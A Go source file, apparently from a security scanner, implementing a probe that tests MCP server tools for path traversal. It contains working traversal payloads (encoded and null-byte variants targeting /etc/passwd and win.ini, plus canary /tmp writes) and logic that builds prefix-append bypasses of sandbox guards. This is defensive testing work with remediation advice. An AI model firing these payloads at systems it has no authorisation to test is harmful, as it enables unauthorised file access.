package mcptool

import (
	"context"
	"fmt"
	"log/slog"
	"regexp"
	"strings"

	"github.com/praetorian-inc/augustus/internal/mcpprobe"
	"github.com/praetorian-inc/augustus/internal/toolpolicy"
	"github.com/praetorian-inc/augustus/pkg/attempt"
	"github.com/praetorian-inc/augustus/pkg/probes"
	"github.com/praetorian-inc/augustus/pkg/recon"
	"github.com/praetorian-inc/augustus/pkg/registry"
	"github.com/praetorian-inc/augustus/pkg/types"
)

func init() {
	probes.Register("mcptool.PathTraversal", NewPathTraversal)
}

var (
	_ types.ProbeMetadata     = (*PathTraversal)(nil)
	_ recon.ContextAwareProbe = (*PathTraversal)(nil)
)

// pathParamRE matches parameter names likely to accept a filesystem path —
// both READ-oriented (file, filename, filepath, path, dir, ...) and WRITE-
// oriented (output, dest, target, log, logfile, ...). Which payload class
// gets sent for a given tool is decided in Probe from the tool's MCP
// annotations, not from the param name — so restoring the write-oriented
// names here does NOT put /etc/passwd at overwrite risk.
//
// Applied via matchesPathParam() which normalises camelCase names to
// snake_case first so `filePath`, `outputPath`, `targetFile` etc. also
// match (fixes CodeRabbit #5). The regex itself only understands
// underscore/hyphen/space separators.
var pathParamRE = regexp.MustCompile(`(?i)(^|[_\- ])(file|filename|filepath|path|dir|directory|folder|template|resource|include|require|load|read|open|attachment|input|output|dest|destination|target|log|logfile|save|store|dump|report|uri|config|conf|settings|document|doc|source|src|location)($|[_\- ])`)

// camelCaseBoundaryRE splits transitions from lowercase/digit → uppercase so
// `outputPath` normalises to `output_Path` (which the case-insensitive
// pathParamRE then matches as `output` followed by a boundary followed by
// `path`). Without this the default matcher would skip common schema names.
var camelCaseBoundaryRE = regexp.MustCompile(`([a-z0-9])([A-Z])`)

// hasProbeableParam reports whether this tool exposes a parameter this probe
// would actually inject into. Used to decide whether the tool is worth a
// discovery invocation at all — see the call site.
func (p *PathTraversal) hasProbeableParam(params []paramInfo) bool {
	for _, param := range params {
		if !isStringParam(param.typ) {
			continue
		}
		if p.allParams || matchesPathParam(param.name) {
			return true
		}
	}
	return false
}

// matchesPathParam tests a parameter name against pathParamRE after camelCase
// normalisation. See the regex-level comment above.
func matchesPathParam(name string) bool {
	normalised := camelCaseBoundaryRE.ReplaceAllString(name, "${1}_${2}")
	return pathParamRE.MatchString(normalised)
}

// hintedPathRE extracts absolute filesystem paths ("/tmp/safe/", "/var/www/",
// C:\Users\) from a tool's description. Many real gates ("Only files in
// /tmp/safe/ are accessible") disclose the allowed prefix in prose; a probe
// that reads the description can defeat startsWith / contains gates with a
// prefix-append payload (`/tmp/safe/../../../etc/passwd`) that a payload set
// without gate awareness can't produce.
var hintedPathRE = regexp.MustCompile(`(?i)(/[a-z0-9_.-]+(?:/[a-z0-9_.-]+)+/?|[a-z]:\\[a-z0-9_.\\-]+)`)

// pathTraversalPayload pairs a payload string with the signature(s) its
// output must contain to prove the sink processed it. Two flavours:
//
//   - READ payloads: signatures are literal file-content markers
//     ("root:x:0:0:", "[extensions]"). A tool that reads /etc/passwd and
//     returns its content matches; a tool that echoes the payload does not.
//   - WRITE payloads: signatures are a per-run canary marker embedded in the
//     target path (e.g. `augwrite-<8hex>`). A tool that WRITES a file to
//     `/tmp/proof-augwrite-<8hex>` and returns a success message echoes the
//     canary in its response. The path is a novel /tmp file that doesn't
//     clobber anything, so this proves the write sink without damage.
type pathTraversalPayload struct {
	payload    string
	signatures []string
	// isWrite marks payloads whose success is the ACT of writing to a
	// canary /tmp path. Reported separately in class metadata so a
	// reviewer sees "path-traversal WRITE to /tmp/proof-<canary>" rather
	// than an ambiguous read-flavoured hit.
	isWrite bool
}

// readPayloads targets well-known readable system files. Signatures are the
// stable content markers only a real read could produce.
var readPayloads = []pathTraversalPayload{
	// Unix /etc/passwd. Cross-platform signatures (macOS's `## User Database`
	// header, `nobody:*:` and `daemon:*:` shared across distros).
	{payload: "../../../../../../etc/passwd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
	{payload: "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
	{payload: "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
	{payload: "....//....//....//....//....//....//etc/passwd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
	{payload: "/etc/passwd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
	{payload: "file:///etc/passwd", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
	// Node.js pre-8 Buffer null-byte truncation.
	{payload: "../../../../../../etc/passwd%00.txt", signatures: []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}},
	// Windows win.ini. `[extensions]`/`[fonts]` present from Windows 3.1
	// through Windows 11.
	{payload: "..\\..\\..\\..\\..\\..\\windows\\win.ini", signatures: []string{"[extensions]", "[fonts]"}},
	{payload: "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini", signatures: []string{"[extensions]", "[fonts]"}},
	{payload: "C:\\windows\\win.ini", signatures: []string{"[extensions]", "[fonts]"}},
}

// buildWritePayloads generates canary-write payloads for a single tool call.
// Each returned payload targets `/tmp/proof-augwrite-<canary>` (a novel path
// that doesn't overwrite anything), with encoding variants matching the
// read set. The canary hex is fresh per call so parallel runs don't collide
// and each attempt's success is self-identifying in the response.
func buildWritePayloads() []pathTraversalPayload {
	canary := "augwrite-" + mcpprobe.RandToken()
	name := "proof-" + canary
	// Signature: the canary appearing in the tool's response text is the
	// signal. The path IS the payload, but the canary is a random 16-hex
	// substring that a tool merely echoing the payload back would still
	// produce — so echo is a false positive here in a way it isn't for
	// arithmetic-canary injection. Compensating check: only tools whose
	// response also contains a success verb (see WritePayloadSuccessRE
	// in the detector) count.
	sig := []string{canary}
	return []pathTraversalPayload{
		{payload: "/tmp/" + name, signatures: sig, isWrite: true},
		{payload: "../../../../tmp/" + name, signatures: sig, isWrite: true},
		{payload: "..%2f..%2f..%2f..%2ftmp%2f" + name, signatures: sig, isWrite: true},
		{payload: "....//....//....//....//tmp/" + name, signatures: sig, isWrite: true},
		{payload: "file:///tmp/" + name, signatures: sig, isWrite: true},
	}
}

// PathTraversal tests a directly-invokable tool surface for filesystem path
// traversal. It runs against every tool the shared mcptool policy permits
// (see internal/probes/mcptool/mcptool.go), selecting the payload flavour
// from the tool's MCP annotations:
//
//   - ReadOnly-annotated tools get READ payloads targeting /etc/passwd and
//     win.ini; success = file-content signature in the response.
//   - Everything else (destructive-annotated, or annotation-absent) gets
//     WRITE payloads targeting a novel /tmp/proof-augwrite-<canary> path;
//     success = the canary echoed back in the tool's response. This
//     structurally avoids overwriting sensitive files like /etc/passwd
//     even when the operator has explicitly opted destructive tools in via
//     allow_destructive=true.
//
// A per-tool description-parser also generates prefix-append variants when
// the description discloses the allowed sandbox ("Only files in /tmp/safe/"),
// defeating naive startsWith gates.
type PathTraversal struct {
	reconContext
	allParams bool
	// requireReadOnlyAnnotation restores the pre-LAB-5568 behaviour: read
	// payloads only ever reach tools the server explicitly annotated ReadOnly,
	// never tools whose read intent was inferred from name and description.
	requireReadOnlyAnnotation bool
	policy                    toolpolicy.Policy
}

// NewPathTraversal reads pathtraversal_all_string_params + the shared
// tool-safety config keys (allow_destructive, tool_allowlist, tool_denylist).
func NewPathTraversal(cfg registry.Config) (probes.Prober, error) {
	probe := &PathTraversal{
		allParams:                 registry.GetBool(cfg, "pathtraversal_all_string_params", false),
		requireReadOnlyAnnotation: registry.GetBool(cfg, "pathtraversal_require_readonly_annotation", false),
		policy:                    toolpolicy.New(cfg),
	}
	probe.configure(cfg)
	return probe, nil
}

func (p *PathTraversal) Name() string { return "mcptool.PathTraversal" }

var _ types.RiskDescriber = (*PathTraversal)(nil)

// RiskInfo is the curated security write-up for this probe's finding.
func (p *PathTraversal) RiskInfo() types.RiskInfo {
	return types.RiskInfo{
		Description:    "A directly-invokable MCP tool exposes a filesystem-path parameter that is not confined to its intended directory, allowing access to files outside the sandbox — including via prefix-preserving payloads that defeat a naive startsWith check.",
		Impact:         "A caller can read files the tool's process can access beyond the intended directory. Where the parameter feeds a write, it also allows creating or overwriting files at chosen paths.",
		Recommendation: "Canonicalize the path (absolute, symlinks resolved) and reject it unless it resolves within an allowlisted base directory — compare the resolved path, not the raw string. Prefer opaque server-side file identifiers over caller-supplied paths, and run the tool with least privilege.",
		References:     "https://cwe.mitre.org/data/definitions/22.html\nhttps://cwe.mitre.org/data/definitions/73.html\nhttps://owasp.org/www-community/attacks/Path_Traversal",
		Taxonomies:     "- cwe: 22\n- cwe: 23\n- cwe: 73",
		CVSSVector:     "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
		Verification: "## How this is confirmed\n\n" +
			"Augustus sends path-traversal payloads to filesystem-path parameters, using payloads that include prefix-preserving forms that defeat a naive `startsWith` check:\n\n" +
			"- Read-only tools receive `/etc/passwd`-class inputs; a response carrying the file's content signature is strong proof the parameter escapes its intended directory.\n" +
			"- Write-capable tools receive a novel canary path under `/tmp`; a success or echoed-path response is an *acceptance* signal — the tool accepted an out-of-directory path — not proof that a file was written. Confirm the write by reading the canary path back (or inspecting the filesystem).\n\n" +
			"## Reproduce\n\n" +
			"Re-run the `mcptool.PathTraversal` probe against the affected endpoint via the `mcp.MCP` generator (`mode: list_tools`). For a read finding the response contains out-of-directory file content; for a write finding, confirm by reading back the canary path the tool accepted.",
	}
}

func (p *PathTraversal) Description() string {
	return "Tests directly-invokable tools for filesystem path traversal. Read-only tools get /etc/passwd-class payloads detected via file-content signatures; write-capable tools get novel /tmp/proof-<canary> payloads detected via canary echo — non-destructive proof of arbitrary-path writes without overwriting sensitive files."
}

func (p *PathTraversal) Goal() string {
	return "Determine whether any directly-invokable tool exposes an unrestricted filesystem-path sink, in EITHER read direction (arbitrary file read via traversal) or write direction (writes to attacker-chosen paths outside the intended sandbox), without damaging the target's files."
}

func (p *PathTraversal) GetPrimaryDetector() string { return "mcptool.PathTraversal" }

func (p *PathTraversal) GetPrompts() []string {
	// Only the read set is stable-across-run and useful for report
	// introspection; write payloads carry per-run canary hex.
	out := make([]string, len(readPayloads))
	for i, p := range readPayloads {
		out[i] = p.payload
	}
	return out
}

// Probe discovers tools, applies the shared mcptool policy (allow/deny/
// destructive gate), picks the read-or-write payload set from each tool's
// annotations, and dispatches. Returns no attempts for non-ToolInvoker
// targets.
func (p *PathTraversal) Probe(ctx context.Context, gen types.Generator) ([]*attempt.Attempt, error) {
	inv, ok := gen.(types.ToolInvoker)
	if !ok {
		return nil, fmt.Errorf("mcptool.PathTraversal: target %q does not support direct tool invocation; this probe requires a tool-surface generator such as mcp.MCP", gen.Name())
	}

	tools, err := p.resolveTools(ctx, gen)
	if err != nil {
		return nil, fmt.Errorf("mcptool.PathTraversal: list tools: %w", err)
	}
	tools = p.policy.Filter(p.Name(), tools)
	if len(tools) == 0 {
		return nil, nil
	}

	var attempts []*attempt.Attempt
	pathParamSeen := false
	for _, tool := range tools {
		name, _ := tool["name"].(string)
		if name == "" {
			continue
		}
		desc, _ := tool["description"].(string)
		hintedPrefixes := extractHintedPrefixes(desc)
		for _, ts := range toolSignatures(tool, p.valueChain(ctx, name)) {
			// Discovery is a REAL invocation, so it only runs against a tool this
			// probe is going to test anyway. Gating on the tool (does it expose a
			// path-shaped parameter?) rather than on the parameter that needs
			// candidates is deliberate: the parameter needing discovery is usually the
			// DISCRIMINATOR, not the path — file_manager(action, path) needs a value
			// for `action` in order to reach the sink through `path`.
			if p.hasProbeableParam(ts.params) {
				ts = ts.discoverValues(ctx, inv, name)
			}

			// Payload flavour selection. A ReadOnly annotation is the only
			// unambiguous positive signal that the tool cannot write; anything
			// else (destructive-annotated OR annotation-absent) uses the
			// write-safe canary path so we never risk clobbering /etc/passwd
			// on a write-capable sink.
			payloads := p.payloadsFor(tool, ts.params)

			for _, param := range ts.params {
				if !isStringParam(param.typ) {
					continue
				}
				if !p.allParams && !matchesPathParam(param.name) {
					continue
				}
				pathParamSeen = true
				if a := ts.untestedAttempt(p.Name(), p.GetPrimaryDetector(), param); a != nil {
					attempts = append(attempts, a)
					continue
				}
				// Baselines are kept per payload so each prefix-append variant can be
				// compared against the unprefixed attempt for the SAME target file.
				baselines := make([]*attempt.Attempt, 0, len(payloads))
				for _, tp := range payloads {
					a := p.callOne(ctx, inv, name, param, ts, tp)
					baselines = append(baselines, a)
					attempts = append(attempts, a)
				}
				// Prefix-append variants — defeat `filename.startswith(prefix)`
				// / `prefix in path` gates that the tool description disclosed.
				for _, prefix := range hintedPrefixes {
					// One accepted-but-absent control per prefix: a path that stays
					// INSIDE the declared sandbox and names something that cannot
					// exist. The guard must accept it, so whatever the tool returns is
					// what "accepted, then failed at the filesystem" looks like on THIS
					// target, in its own language and wording. That makes it the
					// reference the escape attempt is compared against.
					ctl := p.callOne(ctx, inv, name, param, ts, pathTraversalPayload{
						payload: joinHintedPath(prefix, "augctl-"+mcpprobe.RandToken()),
						// No signatures: a control can never itself be a finding.
					})
					ctl.Metadata[attempt.MetadataKeyPathTraversalIsControl] = true
					attempts = append(attempts, ctl)

					for i, tp := range payloads {
						prefixed := pathTraversalPayload{
							payload:    joinHintedPath(prefix, tp.payload),
							signatures: tp.signatures,
							isWrite:    tp.isWrite,
						}
						a := p.callOne(ctx, inv, name, param, ts, prefixed)
						markGuardBypass(a, baselines[i], ctl)
						attempts = append(attempts, a)
					}
				}
			}
		}
	}
	if !pathParamSeen {
		slog.Warn("mcptool.PathTraversal: no path-like tool parameters found; set pathtraversal_all_string_params=true to test every string parameter", "tools", len(tools))
	}
	return attempts, nil
}

// payloadsFor picks the read or write payload set based on the tool's MCP
// annotations. The invariant: /etc/passwd (and any read-oriented sensitive
// file) is only ever the TARGET of a call the server has explicitly
// annotated as ReadOnly. Everything else — destructive-hinted or
// annotation-absent — gets write-safe /tmp/proof-<canary> payloads. A
// server that ships zero annotations therefore never receives a payload
// that could overwrite /etc/passwd, even if allow_destructive=true opened
// the policy gate.
func (p *PathTraversal) payloadsFor(tool map[string]any, params []paramInfo) []pathTraversalPayload {
	// Annotations are stored as a VALUE (types.MCPToolAnnotations) on the
	// tool map by the recon layer's shared shape; see the sibling
	// toolpolicy.Policy.Skip method for the same assertion pattern.
	ann, ok := tool["annotations"].(types.MCPToolAnnotations)
	if ok && ann.ReadOnly {
		return readPayloads
	}
	// No ReadOnly annotation. Annotations are optional in the MCP spec and most
	// servers ship none at all (every DVMCP tool, for one), so treating absence
	// as "might write" left the read oracle — a file-content signature, the
	// strongest evidence this probe has — permanently dark on the majority of
	// real targets. Measured: across all ten DVMCP challenges not one read
	// payload was ever sent.
	//
	// Fall back to the tool's own declared read intent. This is a deliberate
	// risk trade, and the risk is smaller than it first looks: the conservative
	// path is not inert either, since write payloads CREATE files under /tmp.
	// Sending a read payload to a tool that turns out to write would target a
	// sensitive path, so readIntent demands positive evidence and bails on any
	// hint of mutation. Operators who want the old behaviour unconditionally can
	// set pathtraversal_require_readonly_annotation=true.
	if !p.requireReadOnlyAnnotation && readIntent(tool, params) {
		return readPayloads
	}
	return buildWritePayloads()
}

// responseTemplate reduces a response to its invariant shape by removing the one
// part that necessarily differs between attempts: the payload the tool echoed
// back. What remains is the target's own wording for an outcome CLASS, whatever
// language or framework produced it.
//
// This is what makes the guard-bypass oracle phrase-independent. An earlier
// version matched error text against curated English regexes ("no such file or
// directory", "not allowed"), which were derived from one corpus of Python
// servers and would silently miss any target that words its errors differently,
// returns structured errors, or is not in English.
func responseTemplate(a *attempt.Attempt) string {
	if a == nil || len(a.Outputs) == 0 {
		return ""
	}
	s := strings.Join(a.Outputs, "\n")
	if a.Prompt != "" {
		s = strings.ReplaceAll(s, a.Prompt, " ")
	}
	// Quoting around the echoed payload is incidental to the class.
	s = strings.NewReplacer("'", " ", `"`, " ", "`", " ").Replace(s)
	return strings.Join(strings.Fields(s), " ")
}

// markGuardBypass records whether a prefix-append attempt defeated the tool's own
// path guard, using a three-way comparison that never inspects error wording.
//
//	baseline — the bare traversal payload, which the guard is expected to refuse
//	prefixed — the same payload behind the prefix the tool itself disclosed
//	control  — a path inside the declared sandbox naming something that cannot
//	           exist, so the guard MUST accept it and the filesystem MUST fail it
//
// The control is the key. It shows what "accepted by the guard, then failed on
// disk" looks like on this specific target, in this target's own words. So when
// the prefixed attempt lands in the SAME class as the control while the bare
// attempt landed somewhere else, the guard admitted the escaped path — the
// traversal worked, and only an unrelated fact about this host (the sandbox
// directory not existing, say) kept content from coming back. On a deployment
// where that directory exists, the same payload reads arbitrary files.
//
// Both conditions are required. Without "differs from baseline" a target that
// refuses everything identically would look bypassed; without "matches control"
// any unusual response would. A target that answers all three identically
// produces no finding, which is the correct fail-closed outcome for a server too
// terse to tell the classes apart.
func markGuardBypass(prefixed, baseline, control *attempt.Attempt) {
	if prefixed == nil || baseline == nil || control == nil {
		return
	}
	prefixedShape := responseTemplate(prefixed)
	baselineShape := responseTemplate(baseline)
	controlShape := responseTemplate(control)
	if prefixedShape == "" || baselineShape == "" || controlShape == "" {
		return
	}
	// The prefix has to have changed the outcome...
	if prefixedShape == baselineShape {
		return
	}
	// ...and changed it into the one the guard demonstrably accepts.
	if prefixedShape != controlShape {
		return
	}
	prefixed.WithMetadata(attempt.MetadataKeyPathTraversalGuardBypass, true)
	prefixed.WithMetadata(attempt.MetadataKeyPathTraversalBaselineResponse, strings.Join(baseline.Outputs, "\n"))
	prefixed.WithMetadata(attempt.MetadataKeyPathTraversalControlResponse, strings.Join(control.Outputs, "\n"))
}

// extractHintedPrefixes pulls absolute filesystem paths from a tool
// description and returns them normalised as trailing-slash prefixes. Prose
// like "Only files in /tmp/safe/ are accessible" produces ["/tmp/safe/"]; if
// no path is disclosed the probe still runs the base payload set.
func extractHintedPrefixes(desc string) []string {
	if desc == "" {
		return nil
	}
	raw := hintedPathRE.FindAllString(desc, -1)
	seen := make(map[string]bool, len(raw))
	out := make([]string, 0, len(raw))
	for _, p := range raw {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		if !looksLikeFSPrefix(p) {
			continue
		}
		if !strings.HasSuffix(p, "/") && !strings.HasSuffix(p, `\`) {
			p += "/"
		}
		if !seen[p] {
			seen[p] = true
			out = append(out, p)
		}
	}
	return out
}

// urlRouteHintRE matches path shapes that strongly suggest a URL route
// rather than a filesystem prefix — API version prefixes, well-known
// resource discovery paths, and query/fragment markers.
var urlRouteHintRE = regexp.MustCompile(`(?i)(^|/)(api|v\d+|v\d+\.\d+|graphql|rest|rpc|swagger|openapi|\.well-known)($|/)`)

// looksLikeFSPrefix accepts any absolute filesystem-shaped path and rejects
// obvious URL routes. Broadened from a hardcoded directory allowlist
// (fixes CodeRabbit #6) so gates like `/data/uploads/`, `/workspace/files/`,
// `/app/storage/`, `/mnt/nfs/attachments/` — which are all legitimate MCP
// sandbox prefixes — are recognised without requiring the probe to enumerate
// every conceivable directory layout.
//
// Rejection is deliberately conservative: strings containing URL-shaped
// segments (`/api/`, `/v1/`, `/.well-known/`, `/graphql`), query strings,
// or URL fragments are treated as URL routes and skipped. Everything else
// that starts with `/` (Unix) or matches `X:\...` (Windows) qualifies.
func looksLikeFSPrefix(p string) bool {
	if p == "" {
		return false
	}
	// Reject query-string / fragment shapes — URLs, not FS paths.
	if strings.ContainsAny(p, "?#") {
		return false
	}
	// Reject clear URL-route signatures.
	if urlRouteHintRE.MatchString(p) {
		return false
	}
	// Accept Unix absolute paths (must have at least one path segment
	// after the leading /).
	if strings.HasPrefix(p, "/") {
		return len(strings.Trim(p, "/")) > 0
	}
	// Accept Windows drive-letter paths.
	if len(p) >= 3 && p[1] == ':' && (p[2] == '\\' || p[2] == '/') {
		c := p[0]
		return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
	}
	return false
}

// joinHintedPath composes a prefix-bypass payload: append the traversal
// payload to a disclosed prefix so a `startswith(prefix)` gate is satisfied
// but the tool's real filesystem call resolves outside the prefix.
func joinHintedPath(prefix, payload string) string {
	trimmed := strings.TrimLeft(payload, "/\\")
	return prefix + trimmed
}

// callOne invokes one (tool, param, payload) and records the attempt.
func (p *PathTraversal) callOne(ctx context.Context, inv types.ToolInvoker, tool string, param paramInfo, ts toolSig, tp pathTraversalPayload) *attempt.Attempt {
	a := attempt.New(tp.payload)
	a.Probe = p.Name()
	a.Detector = p.GetPrimaryDetector()
	a.Metadata[attempt.MetadataKeyPathTraversalSignatures] = tp.signatures
	a.Metadata["mcptool.tool"] = tool
	a.Metadata["mcptool.param"] = string(param.path)
	if tp.isWrite {
		a.Metadata[attempt.MetadataKeyPathTraversalIsWrite] = true
	}

	res, err := inv.CallTool(ctx, tool, ts.args(param, tp.payload))
	if err != nil {
		// A traversal payload the SERVER refused was submitted and rejected, so it
		// reached no filesystem: a completed test with a negative result. A payload
		// that never arrived tested nothing.
		ts.recordCallFailure(a, param, err)
		return a
	}
	// Surface the tool's own IsError signal so the detector can require a
	// non-error response for write findings (a "Successfully wrote to
	// /tmp/proof-<canary>" is the goal; an "Error: unauthorized path
	// /tmp/proof-<canary>" that just echoes the payload back would be a
	// false positive without this check).
	if res.IsError {
		a.Metadata[attempt.MetadataKeyPathTraversalToolIsError] = true
	}
	a.AddOutput(res.Text)
	a.Complete()
	return a
}
